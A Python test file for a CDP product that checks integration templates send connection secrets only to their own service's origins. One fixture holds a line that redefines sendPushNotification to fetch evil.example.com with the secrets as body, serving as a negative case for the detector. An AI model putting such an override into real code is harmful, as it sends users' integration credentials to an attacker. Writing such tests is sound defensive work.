from typing import Any, Optional

from django.test import SimpleTestCase

from parameterized import parameterized

from products.cdp.backend.integration_origins import integration_origins, integration_worker_calls, public_config
from products.cdp.backend.secret_origins import secret_origins
from products.cdp.backend.templates import HOG_FUNCTION_TEMPLATES

SAMPLE_CONFIGS: dict[str, dict[str, Any]] = {
    "intercom": {"app.region": "US"},
    "salesforce": {"instance_url": "https://acme.my.salesforce.com"},
}

# The fan-out of the Node `template-native-push`, which hands its channels to the worker by id.
PUSH_HOG = """
if (not inputs.channels or length(inputs.channels) == 0) {
    throw Error('No push channel configured. Select at least one channel.')
}
let res := sendPushNotification({
    'integrationIds': arrayMap(channel -> channel.$integration_id, inputs.channels),
    'distinctId': inputs.distinctId,
    'payload': {'title': inputs.title}
})
if (not res.success) {
    throw Error(f'Failed to send push notification: {res.error}')
}
"""

TEMPLATE_INTEGRATION_INPUTS = [
    (f"{template.id}_{schema['key']}", template.code, schema["key"], schema["integration"])
    for template in HOG_FUNCTION_TEMPLATES
    if template.code_language == "hog"
    for schema in template.inputs_schema
    if schema.get("type") == "integration" and schema.get("integration")
]


class TestIntegrationOrigins(SimpleTestCase):
    @parameterized.expand(
        [
            ("static", "slack", {}, frozenset({"https://slack.com"})),
            (
                "instance_from_config",
                "salesforce",
                {"instance_url": "https://acme.my.salesforce.com/"},
                frozenset({"https://acme.my.salesforce.com"}),
            ),
            ("instance_outside_its_service", "salesforce", {"instance_url": "https://evil.example.com"}, frozenset()),
            ("instance_with_a_port", "salesforce", {"instance_url": "https://a.salesforce.com:8443"}, frozenset()),
            (
                "self_hosted_instance",
                "gitlab",
                {"hostname": "https://git.example.com"},
                frozenset({"https://git.example.com"}),
            ),
            ("instance_without_tls", "gitlab", {"hostname": "http://git.example.com"}, frozenset()),
            ("unlisted_kind", "jira", {}, None),
        ]
    )
    def test_integration_origins(self, _name: str, kind: str, config: dict, expected: Optional[frozenset[str]]) -> None:
        assert integration_origins(kind, config) == expected

    @parameterized.expand(
        [
            ("plain_field", {"scope": "chat:write"}, {}, {"scope": "chat:write"}),
            ("field_the_sensitive_config_replaces", {"token": "old"}, {"token": "secret"}, {}),
            ("access_token_the_worker_swaps", {"access_token": "t", "access_token_raw": "t"}, {}, {}),
        ]
    )
    def test_public_config(self, _name: str, config: dict, sensitive_config: dict, expected: dict) -> None:
        assert public_config(config, sensitive_config) == expected

    @parameterized.expand(TEMPLATE_INTEGRATION_INPUTS)
    def test_template_sends_its_connection_only_to_its_service(self, _name: str, hog: str, key: str, kind: str) -> None:
        config = SAMPLE_CONFIGS.get(kind, {})
        allowed = integration_origins(kind, config)

        derived = secret_origins(hog, {key: {"value": 1}}, [], {key}, {key: config})[key]

        assert allowed is not None
        assert isinstance(derived, frozenset) and derived and derived <= allowed, derived

    @parameterized.expand(
        [
            ("firebase", "firebase", PUSH_HOG, True),
            ("apns", "apns", PUSH_HOG, True),
            ("kind_without_the_worker_function", "slack", PUSH_HOG, False),
            (
                "worker_function_replaced_by_the_code",
                "firebase",
                "let sendPushNotification := (x) -> fetch('https://evil.example.com', {'body': x})\n" + PUSH_HOG,
                False,
            ),
            ("connection_also_printed", "firebase", PUSH_HOG + "print(inputs.channels)", False),
        ]
    )
    def test_connection_handed_to_a_worker_function(self, _name: str, kind: str, hog: str, within: bool) -> None:
        allowed = integration_origins(kind, {})
        worker_calls = {"channels": integration_worker_calls(kind)}

        derived = secret_origins(hog, {"channels": {"value": [1]}}, [], {"channels"}, {}, worker_calls)["channels"]

        assert allowed is not None
        assert (isinstance(derived, frozenset) and derived <= allowed) == within, derived
